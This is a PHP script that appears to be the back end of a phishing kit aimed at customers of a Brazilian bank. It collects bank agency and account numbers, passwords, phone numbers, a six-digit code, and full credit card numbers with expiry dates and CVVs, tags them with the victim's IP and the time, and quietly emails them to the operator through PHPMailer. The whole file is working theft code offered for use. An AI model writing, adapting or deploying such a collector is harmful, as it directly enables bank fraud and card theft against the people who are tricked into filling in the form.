<?php
require 'phpmailer/PHPMailerAutoload.php';

extract($_POST);
$ip = $_SERVER['REMOTE_ADDR'];
$data=date("d/m/Y");
$hora=date("H:i");

$conteudo ="
================ Dados ================<br>
$data-($hora) - $ip<br>
AG / CC.....: $txt01 / $txt02<br>
ENTRADA.....: $txt03<br>
CEL ........: $txt04<br>
6 DIG.......: $txt05<br>

============= CC ============<br>

CARTAO : $cc<br>
VALIDADE : $validade<br>
CVV : $cvv<br>
";


$mail = new PHPMailer;

//$mail->SMTPDebug = 3;                               // Enable verbose debug output

$mail->isSMTP();                                      // Set mailer to use SMTP
$mail->Host = $smtp_host;  // Specify main and backup SMTP servers
$mail->SMTPAuth = true;                               // Enable SMTP authentication
$mail->Username = $smtp_user;                 // SMTP username
$mail->Password = $smtp_pass;                           // SMTP password
$mail->SMTPSecure = 'tls';                            // Enable TLS encryption, `ssl` also accepted
$mail->Port = 587;                                    // TCP port to connect to

$mail->setFrom($smtp_user, 'Entregador');
$mail->addAddress($destino);               // Name is optional

$mail->isHTML(true);                                  // Set email format to HTML

$mail->Subject = "[Amarelo]  - $ip";
$mail->Body    = $conteudo;
$mail->AltBody = 'This is the body in plain text for non-HTML mail clients';

@$mail->send();

/*
if(!$mail->send()) {
    echo 'Message could not be sent.';
    echo 'Mailer Error: ' . $mail->ErrorInfo;
} else {
    echo 'Message has been sent';
}
*/